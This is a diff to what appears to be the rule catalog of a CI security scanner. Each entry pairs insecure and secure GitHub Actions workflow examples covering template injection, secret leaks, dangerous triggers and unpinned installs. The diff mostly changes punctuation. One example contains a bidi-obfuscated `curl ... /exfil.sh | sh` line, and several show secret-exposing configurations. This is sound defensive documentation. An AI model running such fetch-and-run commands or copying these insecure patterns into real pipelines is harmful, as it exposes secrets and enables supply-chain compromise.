+      goodExample: `# .github/workflows/deploy.yml: ✅ Correct order
 jobs:
   deploy:
     if: contains(github.event.pull_request.labels.*.name, 'production')
@@ -3532,7 +3532,7 @@ jobs:
         "A single `echo $JSON` after a context dump leaks the full attack surface in one go. Even harmless-looking sinks (logs, third-party actions, HTTP headers) become exfiltration paths because the entire context is in one string.",
       remediation:
         "Reference only the specific fields you actually need. If you need the full payload (rare), write it to a file and consume it with `jq` so the shell never sees the raw JSON.",
-      badExample: `# .github/workflows/debug.yml — ❌ Context dump
+      badExample: `# .github/workflows/debug.yml: ❌ Context dump
 on: pull_request_target
 jobs:
   debug:
@@ -3540,7 +3540,7 @@ jobs:
     steps:
       - run: echo '\${{ toJson(github) }}'`,
       badExampleCaption: "Every PR-author-controllable field becomes part of the shell command.",
-      goodExample: `# .github/workflows/debug.yml — ✅ Specific fields, via env
+      goodExample: `# .github/workflows/debug.yml: ✅ Specific fields, via env
 on: pull_request_target
 jobs:
   debug:
@@ -3552,7 +3552,7 @@ jobs:
         run: echo "PR #$PR_NUMBER at $PR_HEAD_SHA" `,
       goodExampleCaption: "Pick the fields you need; bind through env.",
       tips: [
-        "`toJson(secrets)` is a separate, even worse rule — see ISSUE-309.",
+        "`toJson(secrets)` is a separate, even worse rule; see ISSUE-309.",
         "Use this rule in tandem with ISSUE-207 for full coverage of template-injection paths.",
       ],
       status: "roadmap",
@@ -3576,7 +3576,7 @@ jobs:
         "An unpinned install pulls whatever version of `foo` exists at job time. The package-takeover attacks of 2018–2023 (`event-stream`, `colors`, dozens of typo-squats) relied on exactly this window.",
       remediation:
         "Pin to a specific version (`pip install foo==1.2.3`) or, better, use the language's lockfile mechanism (`pip install -r requirements.txt`, `npm ci`, `bundle install --deployment`).",
-      badExample: `# .github/workflows/test.yml — ❌ Unpinned installs
+      badExample: `# .github/workflows/test.yml: ❌ Unpinned installs
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -3584,7 +3584,7 @@ jobs:
       - run: pip install requests pyyaml
       - run: npm install -g typescript`,
       badExampleCaption: "Whatever version is on PyPI / npm registry at job time becomes part of the runtime.",
-      goodExample: `# .github/workflows/test.yml — ✅ Lockfile-driven
+      goodExample: `# .github/workflows/test.yml: ✅ Lockfile-driven
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -3617,8 +3617,8 @@ jobs:
       impact:
         "A compromised maintainer or a misconfigured org variable becomes a shell-injection sink with no PR-side review. For reusable workflows, an `inputs.*` value passed from `${{ github.event.* }}` is attacker-controlled even though it looks 'safer'.",
       remediation:
-        "Bind the variable through `env:` and reference the env var from the shell — same fix as ISSUE-207.",
-      badExample: `# .github/workflows/reusable.yml — ❌ vars.* inlined
+        "Bind the variable through `env:` and reference the env var from the shell (same fix as ISSUE-207).",
+      badExample: `# .github/workflows/reusable.yml: ❌ vars.* inlined
 on:
   workflow_call:
     inputs:
@@ -3629,7 +3629,7 @@ jobs:
     steps:
       - run: gh pr comment \${{ inputs.pr_title }}`,
       badExampleCaption: "`inputs.pr_title` may carry attacker content from a caller workflow.",
-      goodExample: `# .github/workflows/reusable.yml — ✅ env: indirection
+      goodExample: `# .github/workflows/reusable.yml: ✅ env: indirection
 on:
   workflow_call:
     inputs:
@@ -3643,7 +3643,7 @@ jobs:
         run: gh pr comment "$PR_TITLE" `,
       goodExampleCaption: "Env-bound value reaches the shell with shell quoting intact.",
       tips: [
-        "Same remediation as ISSUE-207 — they're variants of the same root cause.",
+        "Same remediation as ISSUE-207; they're variants of the same root cause.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-207", "ISSUE-213"],
@@ -3666,7 +3666,7 @@ jobs:
         "Consumers of unsigned releases can't verify the asset came from your pipeline rather than from a man-in-the-middle or a compromised release storage. Signature-less releases also block downstream supply-chain attestation chains (e.g. sigstore-policy-controller).",
       remediation:
         "Add a signing step using cosign (for container images and arbitrary blobs) or GPG / minisign (for archives). Publish the signature alongside the asset and document the verification command in your release notes.",
-      badExample: `# .github/workflows/release.yml — ❌ No signature
+      badExample: `# .github/workflows/release.yml: ❌ No signature
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3677,7 +3677,7 @@ jobs:
         with:
           files: dist/*`,
       badExampleCaption: "Binaries are uploaded but never signed.",
-      goodExample: `# .github/workflows/release.yml — ✅ Signed with cosign
+      goodExample: `# .github/workflows/release.yml: ✅ Signed with cosign
 permissions:
   id-token: write   # for OIDC keyless signing
   contents: write
@@ -3720,16 +3720,16 @@ jobs:
       description:
         "A caller workflow passes `secrets: inherit` to a reusable workflow, handing it every secret the caller has access to.",
       impact:
-        "Inheriting is the wrong default. The callee — often a third-party reusable workflow — sees secrets it should never see. A compromise of the callee becomes a compromise of every caller's secret surface.",
+        "Inheriting is the wrong default. The callee, often a third-party reusable workflow, sees secrets it should never see. A compromise of the callee becomes a compromise of every caller's secret surface.",
       remediation:
         "Replace `secrets: inherit` with an explicit list naming only the secrets the callee actually needs.",
-      badExample: `# .github/workflows/release.yml — ❌ Inherits everything
+      badExample: `# .github/workflows/release.yml: ❌ Inherits everything
 jobs:
   publish:
     uses: my-org/shared-workflows/.github/workflows/publish.yml@v1
     secrets: inherit`,
       badExampleCaption: "The callee receives every secret the caller can reach.",
-      goodExample: `# .github/workflows/release.yml — ✅ Named-secrets only
+      goodExample: `# .github/workflows/release.yml: ✅ Named-secrets only
 jobs:
   publish:
     uses: my-org/shared-workflows/.github/workflows/publish.yml@a1b2c3d4e5f6...
@@ -3738,7 +3738,7 @@ jobs:
       goodExampleCaption: "The callee only sees the one secret it needs.",
       tips: [
         "Look at the callee's `on: workflow_call: secrets:` block to know exactly what to pass.",
-        "If you author the reusable workflow, list each `secrets:` block explicitly — never accept `inherit` unconditionally.",
+        "If you author the reusable workflow, list each `secrets:` block explicitly, and never accept `inherit` unconditionally.",
       ],
       relatedCodes: ["ISSUE-309", "ISSUE-301", "ISSUE-801"],
     },
@@ -3760,14 +3760,14 @@ jobs:
         "The redactor matches secrets as exact substrings of log output. Any transformation (JSON round-trip, base64 with a different encoding, hex) produces a different string that prints clear-text in logs.",
       remediation:
         "Use the secret directly via `${{ secrets.X }}`. If you need it parsed, do the parsing inside a step's shell with the env-bound value, not in the template.",
-      badExample: `# .github/workflows/use.yml — ❌ Transformed secret prints unredacted
+      badExample: `# .github/workflows/use.yml: ❌ Transformed secret prints unredacted
 jobs:
   use:
     runs-on: ubuntu-latest
     steps:
       - run: echo "\${{ fromJSON(toJSON(secrets.API_KEY)) }}" `,
       badExampleCaption: "The transformed string is no longer string-equal to the redactor's known value.",
-      goodExample: `# .github/workflows/use.yml — ✅ Direct reference (redaction works)
+      goodExample: `# .github/workflows/use.yml: ✅ Direct reference (redaction works)
 jobs:
   use:
     runs-on: ubuntu-latest
@@ -3798,10 +3798,10 @@ jobs:
       description:
         "A workflow has no top-level `permissions:` block. The job inherits whatever the repo / organisation default is, which is often write-all.",
       impact:
-        "Implicit permissions are silently broad. A workflow that legitimately needs `contents: read` may end up with `contents: write`, `id-token: write`, and a dozen other scopes — any one of which a compromised step can use to push to the repo or impersonate the workflow.",
+        "Implicit permissions are silently broad. A workflow that legitimately needs `contents: read` may end up with `contents: write`, `id-token: write`, and a dozen other scopes. A compromised step can use any one of them to push to the repo or impersonate the workflow.",
       remediation:
         "Add a top-level `permissions:` block listing only the scopes the workflow actually needs. Most workflows only need `contents: read`.",
-      badExample: `# .github/workflows/test.yml — ❌ Inherits whatever the repo default is
+      badExample: `# .github/workflows/test.yml: ❌ Inherits whatever the repo default is
 name: test
 on: [push, pull_request]
 jobs:
@@ -3810,8 +3810,8 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: npm test`,
-      badExampleCaption: "No explicit `permissions:` — relies on the repo default.",
-      goodExample: `# .github/workflows/test.yml — ✅ Least privilege
+      badExampleCaption: "No explicit `permissions:`, so the workflow relies on the repo default.",
+      goodExample: `# .github/workflows/test.yml: ✅ Least privilege
 name: test
 on: [push, pull_request]
 permissions:
@@ -3831,7 +3831,7 @@ github:
       goodExampleCaption: "`contents: read` is sufficient for a test workflow.",
       tips: [
         "Override per-job when a specific job needs more (e.g. `release` needing `contents: write`).",
-        "Org admins can also enforce `permissions: read-all` as the org default — a useful safety net.",
+        "Org admins can also enforce `permissions: read-all` as the org default, a useful safety net.",
         "Pair with ISSUE-803 to catch the over-broad case explicitly.",
       ],
       relatedCodes: ["ISSUE-803", "ISSUE-302"],
@@ -3854,7 +3854,7 @@ github:
         "Environments are GitHub's mechanism for required reviewers, wait timers, and branch-pattern restrictions on secret access. Without one, any caller on the configured trigger goes straight to the secret-bearing step with no human in the loop.",
       remediation:
         "Move production secrets into a GitHub Environment (`Settings > Environments`), configure required reviewers, and reference the environment in the job.",
-      badExample: `# .github/workflows/deploy.yml — ❌ No environment gate
+      badExample: `# .github/workflows/deploy.yml: ❌ No environment gate
 jobs:
   deploy:
     runs-on: ubuntu-latest
@@ -3863,7 +3863,7 @@ jobs:
           PROD_API_KEY: \${{ secrets.PROD_API_KEY }}
         run: ./deploy.sh`,
       badExampleCaption: "Any trigger that reaches this job exfiltrates `PROD_API_KEY` from logs.",
-      goodExample: `# .github/workflows/deploy.yml — ✅ Environment gate
+      goodExample: `# .github/workflows/deploy.yml: ✅ Environment gate
 jobs:
   deploy:
     runs-on: ubuntu-latest
@@ -3895,10 +3895,10 @@ jobs:
       description:
         "A workflow generates an installation token via a GitHub App action (e.g. `create-github-app-token`) with `skip-token-revoke: true`.",
       impact:
-        "A long-lived installation token survives beyond the job. If the runner is compromised mid-job, the token remains usable after the job ends — exactly the window a remote attacker needs.",
+        "A long-lived installation token survives beyond the job. If the runner is compromised mid-job, the token remains usable after the job ends. That is exactly the window a remote attacker needs.",
       remediation:
         "Let the action revoke the token at job end (the default). Remove `skip-token-revoke: true` unless you have a specific cross-job requirement that justifies it.",
-      badExample: `# .github/workflows/release.yml — ❌ Token outlives the job
+      badExample: `# .github/workflows/release.yml: ❌ Token outlives the job
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3910,7 +3910,7 @@ jobs:
           private-key: \${{ secrets.APP_PRIVATE_KEY }}
           skip-token-revoke: true`,
       badExampleCaption: "Token remains valid for ~1 hour after the job ends.",
-      goodExample: `# .github/workflows/release.yml — ✅ Revoke at end of job
+      goodExample: `# .github/workflows/release.yml: ✅ Revoke at end of job
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3920,7 +3920,7 @@ jobs:
         with:
           app-id: \${{ vars.APP_ID }}
           private-key: \${{ secrets.APP_PRIVATE_KEY }}`,
-      goodExampleCaption: "Default revocation behaviour — token is invalidated when the job ends.",
+      goodExampleCaption: "Default revocation behaviour: the token is invalidated when the job ends.",
       tips: [
         "If you need the token across multiple jobs, generate one per job rather than reusing one with revoke skipped.",
       ],
@@ -3942,10 +3942,10 @@ jobs:
       description:
         "A workflow calls `actions/checkout` without `persist-credentials: false`, which leaves the GITHUB_TOKEN bound to `.git/config` for the rest of the job.",
       impact:
-        "A later `actions/upload-artifact` of the checkout directory bundles the credentials inside the artifact zip — visible to anyone who can read the artifact. This is the 'artipacked' leak pattern from 2023.",
+        "A later `actions/upload-artifact` of the checkout directory bundles the credentials inside the artifact zip, visible to anyone who can read the artifact. This is the 'artipacked' leak pattern from 2023.",
       remediation:
         "Set `persist-credentials: false` on every `actions/checkout` step unless you have a specific reason to keep the credentials configured.",
-      badExample: `# .github/workflows/build.yml — ❌ Credentials remain in .git/config
+      badExample: `# .github/workflows/build.yml: ❌ Credentials remain in .git/config
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -3956,7 +3956,7 @@ jobs:
         with:
           path: .   # bundles .git/config including credentials`,
       badExampleCaption: "The artifact zip contains the workflow's GITHUB_TOKEN bound to .git/config.",
-      goodExample: `# .github/workflows/build.yml — ✅ persist-credentials: false
+      goodExample: `# .github/workflows/build.yml: ✅ persist-credentials: false
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -3971,7 +3971,7 @@ jobs:
       goodExampleCaption: "No credentials in .git/config; artifact scoped to dist/.",
       tips: [
         "If a subsequent step needs to push back to the repo, configure git credentials explicitly via `git remote set-url origin https://x-access-token:$GH_TOKEN@github.com/...`.",
-        "Never upload the entire workspace as an artifact — always narrow the path.",
+        "Never upload the entire workspace as an artifact. Always narrow the path.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-801", "ISSUE-309", "ISSUE-301"],
@@ -3991,10 +3991,10 @@ jobs:
       description:
         "A workflow reads a secret using `secrets[expr]` where `expr` is computed at runtime from a template expression.",
       impact:
-        "Runtime indexing defeats static review. A PR-author-controlled expression (`secrets[github.event.pull_request.title]`) lets the attacker choose which secret leaks — the workflow file alone gives no clue about which secret will be accessed.",
+        "Runtime indexing defeats static review. A PR-author-controlled expression (`secrets[github.event.pull_request.title]`) lets the attacker choose which secret leaks. The workflow file alone gives no clue about which secret will be accessed.",
       remediation:
         "Reference secrets by their literal name (`${{ secrets.AWS_ACCESS_KEY_ID }}`). If you need to switch between secrets, use a switch statement in a shell step with env-bound options rather than dynamic indexing.",
-      badExample: `# .github/workflows/multi-env.yml — ❌ Dynamic index
+      badExample: `# .github/workflows/multi-env.yml: ❌ Dynamic index
 on:
   workflow_dispatch:
     inputs:
@@ -4007,7 +4007,7 @@ jobs:
           KEY: \${{ secrets[format('API_KEY_{0}', inputs.target)] }}
         run: ./deploy.sh`,
       badExampleCaption: "`inputs.target` controls which secret is read.",
-      goodExample: `# .github/workflows/multi-env.yml — ✅ Explicit switch
+      goodExample: `# .github/workflows/multi-env.yml: ✅ Explicit switch
 on:
   workflow_dispatch:
     inputs:
@@ -4043,12 +4043,12 @@ jobs:
       controlName: "Workflow must not use dangerous triggers",
       controlConfigKey: "workflowMustNotUseDangerousTriggers",
       description:
-        "A job runs under a trigger that combines attacker-controlled input with the base repository's secrets — `workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork` — **and checks out fork-controlled code** (an `actions/checkout` whose `ref:` is the workflow_run head or a PR-controlled ref). Untrusted code then executes with the base repo's secrets and GITHUB_TOKEN. The `pull_request_target` case is owned by [ISSUE-804](./ISSUE-804) (`pullRequestTargetMustNotCheckoutHead`), so this rule never fires on it — same exploit class, dedicated rule, no double-firing. Subscribing to such a trigger is **not** flagged on its own: labelling, milestone, comment and notification workflows legitimately need them and are safe without an untrusted checkout. The finding fires only on the exploitable combination, and abstains when a job-level `if:` neutralises the risk — a same-repository pull-request guard, a `workflow_run` gated to an upstream push (`github.event.workflow_run.event == 'push'`), or a trusted `author_association` allowlist.",
+        "A job runs under a trigger that combines attacker-controlled input with the base repository's secrets (`workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion`, `discussion_comment`, `gollum`, `fork`) **and checks out fork-controlled code** (an `actions/checkout` whose `ref:` is the workflow_run head or a PR-controlled ref). Untrusted code then executes with the base repo's secrets and GITHUB_TOKEN. The `pull_request_target` case is owned by [ISSUE-804](./ISSUE-804) (`pullRequestTargetMustNotCheckoutHead`), so this rule never fires on it: same exploit class, dedicated rule, no double-firing. Subscribing to such a trigger is **not** flagged on its own: labelling, milestone, comment and notification workflows legitimately need them and are safe without an untrusted checkout. The finding fires only on the exploitable combination, and abstains when a job-level `if:` neutralises the risk: a same-repository pull-request guard, a `workflow_run` gated to an upstream push (`github.event.workflow_run.event == 'push'`), or a trusted `author_association` allowlist.",
       impact:
-        "This is the same exploit class as the March 2025 tj-actions/changed-files vector (CVE-2025-30066) that exfiltrated secrets from hundreds of projects including aquasecurity/trivy. Once fork code runs with the base repo's secrets, every shell step is a direct exfiltration path — `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content). The blast radius is the union of the job's permissions and every secret the workflow can read.",
+        "This is the same exploit class as the March 2025 tj-actions/changed-files vector (CVE-2025-30066) that exfiltrated secrets from hundreds of projects including aquasecurity/trivy. Once fork code runs with the base repo's secrets, every shell step is a direct exfiltration path: `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content). The blast radius is the union of the job's permissions and every secret the workflow can read.",
       remediation:
         "Three options, from strongest to most permissive: (1) drop the head checkout and let the job only operate on the base branch; (2) move the work to a plain `pull_request` trigger that runs without secret access; or (3) keep the head checkout but add a same-repository `if:` guard so fork-controlled runs never reach the job. Option 3 is the right answer for trusted-maintainer-only preview/build flows.",
-      badExample: `# .github/workflows/preview.yml — ❌ workflow_run chains off a fork-influenceable workflow
+      badExample: `# .github/workflows/preview.yml: ❌ workflow_run chains off a fork-influenceable workflow
 on:
   workflow_run:
     workflows: ["lint"]
@@ -4061,8 +4061,8 @@ jobs:
         with:
           ref: \${{ github.event.workflow_run.head_sha }}   # ← fork-controlled
       - run: npm install && npm test                        # ← runs with base secrets`,
-      badExampleCaption: "The fork-controlled head SHA from the chained workflow runs with the secret-bearing GITHUB_TOKEN — same exploit class as the tj-actions / CVE-2025-30066 vector.",
-      goodExample: `# .github/workflows/preview.yml — ✅ same-repository guard: fork code never runs
+      badExampleCaption: "The fork-controlled head SHA from the chained workflow runs with the secret-bearing GITHUB_TOKEN, the same exploit class as the tj-actions / CVE-2025-30066 vector.",
+      goodExample: `# .github/workflows/preview.yml: ✅ same-repository guard: fork code never runs
 on:
   workflow_run:
     workflows: ["lint"]
@@ -4084,7 +4084,7 @@ github:
       enabled: true`,
       goodExampleCaption: "The `if:` blocks fork-originated runs entirely; only same-repository commits ever reach the checkout.",
       tips: [
-        "The `pull_request_target` exploit pattern is owned by ISSUE-804 (pullRequestTargetMustNotCheckoutHead) — this rule excludes it to avoid double-firing on the same job.",
+        "The `pull_request_target` exploit pattern is owned by ISSUE-804 (pullRequestTargetMustNotCheckoutHead); this rule excludes it to avoid double-firing on the same job.",
         "Recognised guards: same-repository (`head.repo.full_name == github.repository`, `head.repo.fork == false`, `head.repo.fork != true`, `!github.event.pull_request.head.repo.fork`); a `workflow_run` restricted to an upstream push (`github.event.workflow_run.event == 'push'`); and a trusted `author_association` allowlist (`== 'OWNER' | 'MEMBER' | 'COLLABORATOR'`, or `contains(fromJSON('[…]'), …author_association)`). A negated check like `author_association != 'OWNER'` is a denylist, not a guard, and still fires.",
         "Recognised untrusted refs: `github.event.pull_request.head.sha`, `head.ref`, `github.head_ref`, `github.event.workflow_run.head_sha`, `head_branch`.",
         "Metadata-only jobs (labelling, milestone, comment reactions) under these triggers are safe and intentionally not flagged.",
@@ -4107,10 +4107,10 @@ github:
       description:
         "A workflow on the `pull_request_target` trigger explicitly checks out `github.event.pull_request.head.sha` (or `head_ref`). The job has access to the base repository's secrets *and* runs the PR author's code.",
       impact:
-        "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise. Any shell step that runs after the checkout is a direct path to secret exfiltration — `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content).",
+        "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise. Any shell step that runs after the checkout is a direct path to secret exfiltration: `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content).",
       remediation:
         "Remove the explicit head checkout. `pull_request_target` should only check out the base branch (the default), where the code under review has already been merged.",
-      badExample: `# .github/workflows/lint.yml — ❌ Head checkout in privileged trigger
+      badExample: `# .github/workflows/lint.yml: ❌ Head checkout in privileged trigger
 on: pull_request_target
 jobs:
   lint:
@@ -4121,7 +4121,7 @@ jobs:
           ref: \${{ github.event.pull_request.head.sha }}   # ← attacker code
       - run: ./lint.sh`,
       badExampleCaption: "The PR author's code now runs with `pull_request_target`'s secret-bearing GITHUB_TOKEN.",
-      goodExample: `# .github/workflows/lint.yml — ✅ Use pull_request, no head checkout needed
+      goodExample: `# .github/workflows/lint.yml: ✅ Use pull_request, no head checkout needed
 on: pull_request
 permissions:
   contents: read
@@ -4132,7 +4132,7 @@ jobs:
       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
         # default ref: github.event.pull_request.head.sha is fine on pull_request
       - run: ./lint.sh`,
-      goodExampleCaption: "`pull_request` runs without secret access on fork PRs — head checkout is safe.",
+      goodExampleCaption: "`pull_request` runs without secret access on fork PRs, so the head checkout is safe.",
       tips: [
         "If a workflow truly needs both PR code AND secrets, the right pattern is: PR workflow uploads diff artefact → trusted workflow_run consumes it (no checkout).",
         "Plumber's default-on `actionsMustBePinnedByCommitSha` + ISSUE-802 + this rule cover the tj-actions class of vulnerabilities end-to-end.",
@@ -4158,7 +4158,7 @@ jobs:
         "A control that exists in policy but not in the pipeline gives a false sense of coverage. Auditors looking at the org-wide policy see the rule; the repo's actual workflow run does not exercise it. Common cases: a new repo onboarded without copying the security workflow, a refactor that dropped a `uses:` step, or a misspelled action name that resolves to nothing.",
       remediation:
         "Add a step or job in one of the project's workflow files that references the required action or reusable workflow. The two shapes the control accepts: step-level `uses: <owner>/<repo>[/path]@<ref>` (action invocation) and job-level `jobs.<name>.uses: <owner>/<repo>/.github/workflows/<file>.yml@<ref>` (reusable workflow call). Plumber matches the `owner/repo[/path]` prefix ref-agnostically, so any pinned ref works.",
-      badExample: `# .github/workflows/ci.yml — ❌ Required SAST action is not referenced
+      badExample: `# .github/workflows/ci.yml: ❌ Required SAST action is not referenced
 on: [push, pull_request]
 jobs:
   build:
@@ -4175,7 +4175,7 @@ jobs:
 #       requiredGroups:
 #         - ["myorg/sast-scan", "myorg/dependency-review"]`,
       badExampleCaption: "Neither `myorg/sast-scan` nor `myorg/dependency-review` is referenced anywhere; the policy fires for both.",
-      goodExample: `# .github/workflows/ci.yml — ✅ Required actions wired up
+      goodExample: `# .github/workflows/ci.yml: ✅ Required actions wired up
 on: [push, pull_request]
 jobs:
   build:
@@ -4219,7 +4219,7 @@ jobs:
         "Over-broad GITHUB_TOKEN scopes magnify the impact of any other vulnerability. A template-injection in a `write-all` job lets the attacker push to the repo, create releases, modify branch protection, etc.",
       remediation:
         "List only the scopes the job actually needs. Most jobs only need `contents: read`; release jobs need `contents: write`; CodeQL needs `security-events: write`.",
-      badExample: `# .github/workflows/release.yml — ❌ Write-all
+      badExample: `# .github/workflows/release.yml: ❌ Write-all
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -4227,7 +4227,7 @@ jobs:
     steps:
       - run: ./release.sh`,
       badExampleCaption: "`write-all` grants every scope GitHub supports.",
-      goodExample: `# .github/workflows/release.yml — ✅ Scoped
+      goodExample: `# .github/workflows/release.yml: ✅ Scoped
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -4261,10 +4261,10 @@ jobs:
       description:
         "A workflow has no `concurrency:` block at either workflow or job level.",
       impact:
-        "Without concurrency control, a flood of pushes runs every job to completion in parallel — wasting CI minutes and creating race conditions on deploy jobs that share infrastructure.",
+        "Without concurrency control, a flood of pushes runs every job to completion in parallel, wasting CI minutes and creating race conditions on deploy jobs that share infrastructure.",
       remediation:
         "Add a `concurrency:` block with a group key that includes `${{ github.ref }}` (so pushes on the same branch cancel earlier runs).",
-      badExample: `# .github/workflows/test.yml — ❌ No concurrency control
+      badExample: `# .github/workflows/test.yml: ❌ No concurrency control
 name: Unit tests
 on: [push, pull_request]
 jobs:
@@ -4273,7 +4273,7 @@ jobs:
     steps:
       - run: pytest`,
       badExampleCaption: "Rapid pushes pile up indefinitely.",
-      goodExample: `# .github/workflows/test.yml — ✅ One run per ref at a time
+      goodExample: `# .github/workflows/test.yml: ✅ One run per ref at a time
 name: Unit tests
 on: [push, pull_request]
 concurrency:
@@ -4305,12 +4305,12 @@ jobs:
       controlName: "Workflow must not use known misfeature patterns",
       controlConfigKey: "workflowMustNotUseKnownMisfeatures",
       description:
-        "A workflow uses a pattern from Plumber's curated misfeature list — `shell: cmd` on Windows runners, inline `pip install ... | sh`, full-checkout artifact uploads, etc.",
+        "A workflow uses a pattern from Plumber's curated misfeature list: `shell: cmd` on Windows runners, inline `pip install ... | sh`, full-checkout artifact uploads, etc.",
       impact:
         "Each pattern on the list has a documented CVE or post-mortem history. Bundling them into one rule keeps the catalog manageable while still catching the dangerous combinations.",
       remediation:
-        "Plumber's output names the specific misfeature triggered. The remediation depends on the pattern — see Tips below for the common ones.",
-      badExample: `# .github/workflows/build.yml — ❌ Several misfeatures
+        "Plumber's output names the specific misfeature triggered. The remediation depends on the pattern; see Tips below for the common ones.",
+      badExample: `# .github/workflows/build.yml: ❌ Several misfeatures
 jobs:
   build:
     runs-on: windows-latest
@@ -4323,7 +4323,7 @@ jobs:
         with:
           path: .   # ← misfeature: full-workspace artifact`,
       badExampleCaption: "Three misfeatures in one workflow.",
-      goodExample: `# .github/workflows/build.yml — ✅ Modern patterns
+      goodExample: `# .github/workflows/build.yml: ✅ Modern patterns
 jobs:
   build:
     runs-on: windows-latest
@@ -4340,7 +4340,7 @@ jobs:
       tips: [
         "On Windows: prefer `pwsh` over `cmd` or legacy `powershell`.",
         "Replace `curl | sh` style installers with vendored or checksum-verified downloads (see ISSUE-411).",
-        "Never upload the entire workspace — narrow to `dist/`, `target/`, `build/`.",
+        "Never upload the entire workspace. Narrow to `dist/`, `target/`, `build/`.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-307", "ISSUE-411"],
@@ -4363,7 +4363,7 @@ jobs:
         "Obfuscation in CI is a near-certain sign of an attempt to hide malicious commands from human reviewers. The 2021 Trojan Source paper (CVE-2021-42574) demonstrated bidi-override attacks against code review at scale.",
       remediation:
         "Plumber's output points at the suspicious bytes. Inspect the workflow with `cat -v` or a hex editor and replace the unicode with plain ASCII.",
-      badExample: `# .github/workflows/deploy.yml — ❌ Bidi override hidden
+      badExample: `# .github/workflows/deploy.yml: ❌ Bidi override hidden
 jobs:
   deploy:
     runs-on: ubuntu-latest
@@ -4373,7 +4373,7 @@ jobs:
           curl https://safe.example.com‮/exfil.sh | sh   # bidi reverses display
 `,
       badExampleCaption: "The visible URL says 'safe' but the runtime path is 'exfil.sh'.",
-      goodExample: `# .github/workflows/deploy.yml — ✅ Pure ASCII
+      goodExample: `# .github/workflows/deploy.yml: ✅ Pure ASCII
 jobs:
   deploy:
     runs-on: ubuntu-latest
@@ -4405,10 +4405,10 @@ jobs:
       description:
         "A PyPI / npm publish workflow authenticates with a long-lived API token (`secrets.PYPI_API_TOKEN`) instead of OIDC trusted publishing.",
       impact:
-        "Long-lived publish tokens are the most common cause of package-registry account takeover. A leaked token (from any source — log, artifact, compromised maintainer machine) hands an attacker permanent publish rights on every package the token can write to.",
+        "Long-lived publish tokens are the most common cause of package-registry account takeover. A leaked token (from any source: a log, an artifact, a compromised maintainer machine) hands an attacker permanent publish rights on every package the token can write to.",
       remediation:
         "Switch to OIDC. PyPI / TestPyPI support trusted publishers; npm supports trusted publishers via 'OIDC tokens' since 2024. The workflow needs `id-token: write` and no long-lived secret.",
-      badExample: `# .github/workflows/pypi.yml — ❌ Long-lived API token
+      badExample: `# .github/workflows/pypi.yml: ❌ Long-lived API token
 jobs:
   publish:
     runs-on: ubuntu-latest
@@ -4417,7 +4417,7 @@ jobs:
         with:
           password: \${{ secrets.PYPI_API_TOKEN }}`,
       badExampleCaption: "Token in `secrets.PYPI_API_TOKEN` lives until it's manually rotated.",
-      goodExample: `# .github/workflows/pypi.yml — ✅ OIDC trusted publishing
+      goodExample: `# .github/workflows/pypi.yml: ✅ OIDC trusted publishing
 permissions:
   id-token: write
   contents: read
@@ -4453,7 +4453,7 @@ jobs:
         "Allowing external code execution during dependency resolution lets a compromised registry (PyPI typosquat, npm package takeover) execute code in your CI under Dependabot's permissions.",
       remediation:
         "Set `insecure-external-code-execution: deny` (the default) or remove the flag entirely.",
-      badExample: `# .github/dependabot.yml — ❌ External exec allowed
+      badExample: `# .github/dependabot.yml: ❌ External exec allowed
 version: 2
 updates:
   - package-ecosystem: pip
@@ -4462,7 +4462,7 @@ updates:
       interval: weekly
     insecure-external-code-execution: allow`,
       badExampleCaption: "A compromised PyPI package's setup.py runs in Dependabot's update job.",
-      goodExample: `# .github/dependabot.yml — ✅ Deny external exec (default)
+      goodExample: `# .github/dependabot.yml: ✅ Deny external exec (default)
 version: 2
 updates:
   - package-ecosystem: pip
@@ -4492,10 +4492,10 @@ updates:
       description:
         "A `.github/dependabot.yml` ecosystem entry has no `cooldown:` window. Dependabot opens an update PR as soon as a new version exists upstream.",
       impact:
-        "Without a cooldown, a poisoned package version reaches your dependency tree before community advisories are published. The typical detection-to-yank window on PyPI / npm is 24–72 hours — a cooldown of `7d` skips that risk window entirely.",
+        "Without a cooldown, a poisoned package version reaches your dependency tree before community advisories are published. The typical detection-to-yank window on PyPI / npm is 24–72 hours, so a cooldown of `7d` skips that risk window entirely.",
       remediation:
         "Add `cooldown:` (with a `default-days: 7` or per-update-type configuration) to every ecosystem in `dependabot.yml`.",
-      badExample: `# .github/dependabot.yml — ❌ No cooldown
+      badExample: `# .github/dependabot.yml: ❌ No cooldown
 version: 2
 updates:
   - package-ecosystem: npm
@@ -4503,7 +4503,7 @@ updates:
     schedule:
       interval: weekly`,
       badExampleCaption: "Dependabot proposes a bump within minutes of any upstream release.",
-      goodExample: `# .github/dependabot.yml — ✅ 7-day cooldown
+      goodExample: `# .github/dependabot.yml: ✅ 7-day cooldown
 version: 2
 updates:
   - package-ecosystem: npm
@@ -4515,7 +4515,7 @@ updates:
       semver-major-days: 14`,
       goodExampleCaption: "Major bumps wait 14 days; minor/patch wait 7.",
       tips: [
-        "Renovate has the same feature under `minimumReleaseAge` — comparable defense.",
+        "Renovate has the same feature under `minimumReleaseAge`; the defense is comparable.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-901", "ISSUE-903", "ISSUE-214"],
@@ -4535,13 +4535,13 @@ updates:
       description:
